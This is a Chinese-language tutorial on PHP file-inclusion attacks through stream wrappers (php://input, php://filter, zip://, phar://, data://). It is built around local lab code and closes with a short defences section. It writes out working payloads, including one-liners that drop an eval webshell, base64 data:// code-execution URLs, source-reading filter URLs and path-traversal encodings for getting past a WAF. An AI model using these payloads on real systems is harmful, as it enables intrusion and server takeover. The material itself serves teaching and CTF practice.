**php：//input**_：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；_   &#x20;

条件(php.ini)：       &#x20;

* allow\_url\_fope   off/on       &#x20;
* allow\_url\_include on   &#x20;

仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow\_url\_include。

php://stdin是只读的，php://stdout 和 php://stderr 是只写的。     php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。   &#x20;

php://fd 允许直接访问指定的文件描述符。

在CTF中经常使用的是php://filter和php://input

* php://filter用于读取源码
* php://input用于执行php代码

### 12.4 php://input

php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。

因为它不依赖于特定的 php.ini 指令。

注：enctype="multipart/form-data" 的时候 php://input 是无效的。

注：遇到file\_get\_contents()要想到用php://input绕过。

**条件：**   &#x20;

* php <5.0 ，allow\_url\_include=Off/On 情况下也可以用   &#x20;
* php > 5.0，只有在allow\_url\_fopen=On 时才能使用

**测试代码：**

```php
<meta charset="utf-8">
<?php
error_reporting(0);
$file = $_GET["file"];        //获取file参数
if(stristr($file,"php://filter") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"date:")){
    exit('hacker!');    //判断是否有php://filter zip:// phar:// date:协议 如果有提示hacker
}
if($file){
    if ($file!="http://www.baidu.com") echo "tips: flag在当前目录的某个文件中";    
    include($file);    //如果传参有值 而且不等于baidu那么提示flag在当前目录的某个文件中 而这一句话没有任何意义 则file有内容直接包含
}else{
    echo '<a href="?file=http://www.baidu.com">clieck go baidu</a>';    //如果不是的话提示clieck go baidu
}
?>
```

**1.利用php://input执行phpinfo代码**

它会读取POST的内容进行执行因为把php代码include到里面了php代码就会执行

```
http://127.0.0.1/ctf/2/php_input.php?file=php://input<?php phpinfo(); ?>
```

这样就可以获取phpinfo页面说明代码成功执行了 我们要获取flag

![](<../../.gitbook/assets/image (901).png>)



**2.利用php://input system来执行当前系统的操作目录**

```php
<?php system("dir"); ?>
```

![](<../../.gitbook/assets/image (925).png>)



**3.利用php://input 写shell**

既然可以执行php代码那么可以利用来生成一个一句话木马文件

```php
<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[key])?>');?>
//fputs写文件
//fopen获取了shell.php的对象
//w 写的操作 i是写
//一句话木马
//如果一句话木马内容为双引号那么不会成功执行
```

![](<../../.gitbook/assets/image (937).png>)



这样就写了shell.php

### 12.5 php\_filter （本地磁盘文件进行读取）重点理解

php://filter：(读取文件)

php://filter 是一种元封装器， 设计用于数据流打开时的[筛选过滤](https://www.php.net/manual/zh/filters.php)应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 [readfile()](https://www.php.net/manual/zh/function.readfile.php)、 [file()](https://www.php.net/manual/zh/function.file.php) 和 [file\_get\_contents()](https://www.php.net/manual/zh/function.file-get-contents.php)， 在数据流内容读取之前没有机会应用其他过滤器。 可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。

php://filter **参数**

| **名称**             | **描述**                                      | **说明**                   |
| ------------------ | ------------------------------------------- | ------------------------ |
| resource=<要过滤的数据流> | 这个参数是必须的。它指定了你要筛选过滤的数据流。                    | 理解为文件名字                  |
| read=<读链的筛选列表>     | 该参数可选。可以设定一个或多个过滤器名称，以管道符（\|）分隔。            | \|可以加或不加，如果加可以Base64进行编码 |
| write=<写链的筛选列表>    | 该参数可选。可以设定一个或多个过滤器名称，以管道符（\|）分隔。            |                          |
| <；两个链的筛选列表>        | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |                          |

**语法**

* **Example #2** php://filter/resource=**<待过滤的数据流>**

这个参数必须位于 php://filter 的末尾，并且指向需要过滤筛选的数据流。

```php
<?php
/* 这简单等同于：
  readfile("http://www.example.com");
  实际上没有指定过滤器 */


readfile("php://filter/resource=http://www.example.com");    //readfile文件读取的函数 通过php伪协议的php://filter的resource读取网址给readfile参数
?>
```

* **Example #3** php://filter/read=**<读链需要应用的过滤器列表>**

这个参数采用一个或以管道符 | 分隔的多个过滤器名称。

```php
<?php
/* 这会以大写字母输出 www.example.com 的全部内容 */
readfile("php://filter/read=string.toupper/resource=http://www.example.com");    //通过php伪协议的php://filter指定read等于string.toupper编码方式 resource是网址



/* 这会和以上所做的一样，但还会用 ROT13 加密。 */
readfile("php://filter/read=string.toupper|string.rot13/resource=http://www.example.com");    //string.toupper编码加string.rot13加密 
?>
```

* **Example #4** php://filter/write=**<写链需要应用的过滤器列表>**

这个参数采用一个或以管道符 | 分隔的多个过滤器名称。

```php
<?php
/* 这会通过 rot13 过滤器筛选出字符 "Hello World"
  然后写入当前目录下的 example.txt */
file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello World");    //write=string.rot13写入到example.txt内容为Hello World
?>
```

**参考php官网**[https://www.php.net/manual/zh/wrappers.php.php](https://www.php.net/manual/zh/wrappers.php.php)

**测试代码：**

**index.html**

```markup
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>CTF</title>
    </head>
    <body>
        <a href="./index.php?file=show.php">click me? no</a>
    </body>
</html>
```

**index.php**

```php
<html>
    <title>Bugku-ctf</title>
    
<?php
    error_reporting(0);
    if(!$_GET[file]){echo '<a href="./index.php?file=show.php">click me? no</a>';}
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file);
//flag:flag{edulcni_elif_lacol_si_siht}
?>
</html>
```

**show.php**

```php
<html>
    <title>Bugku-ctf</title>
    
test5</html>
```

* 打开地址 点击一下  [click me? no](http://127.0.0.1/1/index.php?file=show.php) &#x20;

![](<../../.gitbook/assets/image (900).png>)

直接跳到 http://127.0.0.1/1/index.php?file=show.php 从URL得到出file传参包含得到show.php

![](<../../.gitbook/assets/image (931).png>)

* 使用伪协议php://filter base64编码进行包含index.php

```
http://127.0.0.1/1/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
```

![](<../../.gitbook/assets/image (939).png>)

* 得到base64编码

PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4=

* 使用Burp解密得到
* flag为flag:flag{edulcni\_elif\_lacol\_si\_siht}

### 12.6 php://output

是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。

**测试代码：**

```php
<?php  
$code=$_GET["a"];  
file_put_contents($code,"test");   
?> 
```

·  http://127.0.0.1/5.php?a=php://output  &#x20;

![](<../../.gitbook/assets/image (955).png>)



### 12.7 zip://, bzip2://, zlib://协议 

zip://, bzip2://, zlib://协议条件：   &#x20;

* allow\_url\_fope   off/on   &#x20;
* allow\_url\_include off/on
*
* bzip2:_//使用方法：_   &#x20;
* bzip2:_//file.bz2_zlib:_//使用方法：_   &#x20;
* zlib:_//file.gz_

```
3个封装协议，都是直接打开压缩文件。
compress.zlib://file.gz - 处理的是 '.gz' 后缀的压缩包
compress.bzip2://file.bz2 - 处理的是 '.bz2' 后缀的压缩包
zip://archive.zip#dir/file.txt - 处理的是 '.zip' 后缀的压缩包里的文件
```

zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。

可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。

* zip://中只能传入绝对路径。
* 要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
* 只需要是zip的压缩包即可，后缀名可以任意更改。
* 相同的类型的还有zlib://和bzip2://

**zip://协议**

php 版本大于等于 php5.3.0

* zip:_//使用方法：_   &#x20;
* zip:_//\[压缩文件绝对路径]#\[压缩文件内的子文件名]_

要用绝对路径+url编码#

* 创建一个uploads文件夹

![](<../../.gitbook/assets/image (917).png>)



**测试代码：**

//index.php

```php
<meta charset="utf8">
<?php
error_reporting(0);
$file = $_GET["file"];
if (!$file) echo '<a href="?file=upload">upload?</a>';
if(stristr($file,"input")||stristr($file, "filter")||stristr($file,"data")/*||stristr($file,"phar")*/){
    echo "hick?";
    exit();
}else{
    include($file.".php"); //着重注意这个后缀，适合前面的file拼接的也就是zip://c:/a.zip%23backdoor与这个后缀拼搂，后缀是什么,压缩包文件的后缀是什么
}
?>
<!-- flag在当前目录的某个文件中 -->
```

//upload.php

```php
<meta charset="utf-8">
<form action="upload.php" method="post" enctype="multipart/form-data" >
     <input type="file" name="fupload" />
     <input type="submit" value="upload!" />
</form>
you can upload jpg,png,zip....<br />
<?php
if( isset( $_FILES['fupload'] ) ) {
    $uploaded_name = $_FILES[ 'fupload' ][ 'name' ];         //文件名
    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);   //文件后缀
    $uploaded_size = $_FILES[ 'fupload' ][ 'size' ];         //文件大小
    $uploaded_tmp  = $_FILES[ 'fupload' ][ 'tmp_name' ];     // 存储在服务器的文件的临时副本的名称
    $target_path = "uploads\\".md5(uniqid(rand())).".".$uploaded_ext;
    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" || strtolower( $uploaded_ext ) == "zip" ) &&
        ( $uploaded_size < 100000 ) ) {
        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {// No
            echo '<pre>upload error</pre>';
        }
        else {// Yes!
            echo "<pre>".dirname(__FILE__)."\\{$target_path} succesfully uploaded!</pre>";
        }
    }
    else {
        echo '<pre>you can upload jpg,png,zip....</pre>';
    }
}
?>
```

* 点击upload？直接跳转

![](<../../.gitbook/assets/image (973).png>)

* 跳转到文件上传功能上 题目思路上传文件再利用压缩包协议进行包含获取webshell

从上传分析只能上传jpg，png，zip.....

![](<../../.gitbook/assets/image (941).png>)

* 上传一个压缩包里面包含php的文件 并且得到了绝对路径
* 利用zip协议进行包含并且加上%23和压缩包里面文件（如果不用%23而用#后面的文件是被忽略）

```
?file=zip://D:\phpstudy_pro\WWW\CTF\3\uploads\8a10fd88e3ab15c68d1596b0b4377816.zip%23test.php
```

![](<../../.gitbook/assets/image (954).png>)

访问失败 因为在代码中是拼接了一个php

![](<../../.gitbook/assets/image (974).png>)

在访问的时候去掉“ .php ”就可以了

![](<../../.gitbook/assets/image (946).png>)

如果把压缩包改成“jpg”是否还可以通过zip协议识别包含

![](<../../.gitbook/assets/image (919).png>)

```
http://127.0.0.1/ctf/3/php_zip.php?file=zip://D:\phpstudy_pro\WWW\CTF\3\uploads\8a10fd88e3ab15c68d1596b0b4377816.jpg#test
```

![](<../../.gitbook/assets/image (956).png>)

说明zip协议不会校验后台的名称，不管是jpg还是png等等都会当成zip文件

**bzip2://协议**

**使用方法：**

`compress.bzip2://file.bz2`

相对路径也可以

测试

用7-zip生成一个bz2压缩文件。

pyload:[`http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Desktop/test.bz2`](http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Desktop/test.bz2)

或者文件改为jpg后缀

`` ` http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Desktop/test.jpg ``

![](<../../.gitbook/assets/image (910).png>)

**zlib://协议**

**使用方法：**

`compress.zlib://file.gz`

相对路径也可以

`` ` http://127.0.0.1/xxx.php?a=compress.zlib://file.gz ``&#x20;

![](<../../.gitbook/assets/image (922).png>)



```php
# 1.jpg 代码
<?php phpinfo(); ?>
```

![](<../../.gitbook/assets/image (947).png>)

**扩展**

尝试利用其它协议进行测试

```php
<meta charset="utf8">
<?php
//error_reporting(0);
$file = $_GET["file"];
if (!$file) echo '<a href="?file=upload">upload?</a>';
    echo $file;
    include($file.".php"); //着重注意这个后缀，适合前面的file拼接的也就是zip://c:/a.zip%23backdoor与这个后缀拼搂，后缀是什么,压缩包文件的后缀是什么
}
?>
<!-- flag在当前目录的某个文件中 -->
```

省略

**phar://** 有点类似zip://同样可以导致 任意代码执行。

phar://中相对路径和绝对路径都可以使用

![](<../../.gitbook/assets/image (930).png>)

### 12.8 php-date

条件：   &#x20;

allow\_url\_fope = on    allow\_url\_include = on

data://：将原本的include的文件流重定向到了用户可控制的输入流中

条件：     allow\_url\_include=On     php > 5.2\


**测试代码：**\
****

```php
//include.php 
<?php 
    @$file = $_GET['file']; 
    @include($file); 
?>
```

**通过data://text/plain协议包含phpinfo**

```
?file=data://text/plain,<?php phpinfo();?>
```

![](<../../.gitbook/assets/image (969).png>)



**通过data://text/plain协议包含Base64编码phpinfo**

```
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
```

![](<../../.gitbook/assets/image (920).png>)



**通过data:text/plain协议包含phpinfo（省掉“//”）**

```
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
```

![](<../../.gitbook/assets/image (934).png>)



**通过data://text/plain协议包含Base64编码\<?php system("dir");?>**

```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTs/Pg==
```

![](<../../.gitbook/assets/image (935).png>)



**通过data://text/plain协议包含利用一句话木马**

```
?file=data://text/plain,<?php fputs(fopen("shell.php","w"),'<?php eval($_POST[cmd]);?>');?>
```

![](<../../.gitbook/assets/image (916).png>)

## 13、

```php
# 例如这样限制了我们只能包含 .html 的文件
# 文件名称: 2.php

<?php
if(isset($_GET['x']))
{
    include $_GET['x'] . '.html';
}
?>
```

限制了只能包含 `.xxx`  文件的绕过方法

### 13.1 绕过方法一 - zip协议

新建一个名为1.html的文件，内容为`<?php phpinfo();?>`，然后压缩为名为111.zip的zip文件。

接着利用网站的上传功能上传文件

![](<../../.gitbook/assets/image (950).png>)

攻击payload:  \`  http://atest.test/2.php?x=zip://111.zip%231 ``&#x20;

![](<../../.gitbook/assets/image (927).png>)

### 13.2 绕过方法二 - zip协议

有的上传点可能限制死了,你只能上传jpg的图片那么你可以这样做

新建一个名为1.html的文件，内容为`<?php phpinfo();?>`，然后压缩为名为111.zip的zip文件。

接着 111.zip 改名为 111.jpg

攻击payload: `` http://atest.test/2.php?x=zip://111.jpg%231&#x20;

![](<../../.gitbook/assets/image (921).png>)

### 13.3 绕过方法三 - phar协议

新建一个名为1.html的文件，内容为`<?php phpinfo();?>`，然后压缩为名为111.zip的zip文件。

\
如果可以上传zip文件则上传zip文件，若不能则重命名为111.jpg后上传。

攻击payload-1: [http://atest.test/2.php?x=phar://111.jpg%2F1](http://atest.test/2.php?x=phar://111.jpg%252F1)

攻击payload-2: [http://atest.test/2.php?x=phar://111.zip%2F1](http://atest.test/2.php?x=phar://111.zip%252F1)

这两个payload 就看你能上传哪个文件了

如果可以上传 jpg 那么就使用payload-1

如果可以上传 zip 那么就使用payload-2

参考[https://www.yuque.com/pmiaowu/web\_security\_1/yzr176#QKRsZ](https://www.yuque.com/pmiaowu/web\_security\_1/yzr176#QKRsZ)

**总结**

通过实验发现这个可能是编码的问题因为\<?php phpinfo();?>在编成base64的时候出现了+。而浏览器不认识+号。所以解决方法

* 不写后面的?> 因为PHP里面其实不需要写后面的 前面的；号就已经说明结束了。如果没有；号就必须写?>作为结束。
* 添加空格改变base64编码。
* 将+号换成%2b

将\<?php phpinfo();?>改变成url编码

![](<../../.gitbook/assets/image (911).png>)



## 14、JSP包含

&#x20;**#静态包含**

Jsp中的静态包含语句为

<%@ include file=”page.txt”%>

编写好page.txt后访问index.asp,page.txt将会被解析。Jsp语法规定include指令为静态包含只能调用已经存在于服务器中的文件，因此include指令将不存在文件包含漏洞。

&#x20;              \# **动态包含**

动态包含语句为：\<jsp:include page=”page.txt”/>

与静态包含相反在运行时会先处理被包含的页面，然后再包含，而且可以包含一个动态页面。

## 15、WAF

当碰到 WAF 时，可以把 <> 这些特殊符号进行编码再试。

如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过       &#x20;

特殊字符绕过       &#x20;

某些情况下，读文件支持使用Shell通配符，如 ? \* 等       &#x20;

url中 使用 ? # 可能会影响include包含的结果       &#x20;

某些情况下，unicode编码不同但是字形相近的字符有同一个效果

url编码、双层（多层）url编码

%2e%2e%2f   解码：../

%2e%2e%5c  解码：..\\

%25%2e%25%2e%255c 解码：..\（可使用burp多层编码和解码）

uniclode/UTF-8编码

..%c0%af  解码：../

%c1%9c  解码：..\\

但编码能否正确的起到效果，得看web server是否能对编码后的做解析

## 16、文件包含防御

* PHP中使用open\_basedir配置限制访问在指定目录的区域
* 过滤.(点）/（反斜杠）\（反斜杠）
* 禁止服务器远程文件包含
* 尽量不要使用动态包含，可以在需要包含的页面固定写好
* 可以通过调用str\_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。
